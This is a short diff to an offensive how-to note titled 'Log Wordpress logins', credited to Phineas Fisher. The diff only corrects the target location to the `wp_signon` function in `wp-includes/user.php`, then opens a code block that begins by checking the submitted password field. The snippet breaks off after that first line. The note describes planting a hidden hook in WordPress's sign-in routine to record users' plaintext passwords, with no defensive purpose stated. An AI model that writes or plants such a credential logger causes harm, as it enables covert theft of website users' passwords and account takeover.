@@ -1,8 +1,7 @@
 # Log Wordpress logins
 Credits: Phineas Fisher
 
-in `wp-includes/users.php`:
-in function `wp_signon`:
+in `wp-includes/user.php`, function `wp_signon`:
 
 ```
 if ( ! empty($_POST['pwd']) ) {
